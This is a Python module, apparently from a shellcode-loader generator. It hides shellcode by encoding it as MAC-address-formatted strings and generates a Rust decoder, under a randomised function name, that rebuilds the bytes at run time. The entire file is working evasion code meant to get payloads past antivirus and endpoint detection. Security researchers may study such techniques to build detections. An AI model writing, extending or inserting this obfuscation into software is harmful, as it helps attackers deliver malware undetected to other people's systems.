import random
import string

class MACObfuscate:

    def __init__(self):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self):
        return []

    def codeblock(self):
        return f"""
fn {self.name}(encoded: &[&str]) -> Vec<u8> {{
    let mut decoded: [u8; {self.size}] = [0; {self.size}];
    for (i, mac) in encoded.iter().enumerate(){{
        println!("{{}}: {{}}", i, mac);
        let macbytes: Vec<&str> = mac.split('-').collect();
        for (j, macbyte) in macbytes.iter().enumerate(){{
            if i*6+j >= {self.size}{{
                return decoded.to_vec()
            }}
            decoded[i*6 + j] =  u8::from_str_radix(macbyte, 16).unwrap();
        }}
    }}
    decoded.to_vec()
}}
"""

    def compilerOptions(self):
        return []

    def obfuscate(self, decoded):
        encoded = []
        self.size = len(decoded)
        for i in range(0, len(decoded), 6):
            chunk = decoded[i:i+6]
            if len(chunk) < 6:
                chunk = chunk + (b"\x90" * (6 - len(chunk)))
            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
        return encoded

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}(&{{shellcode}})')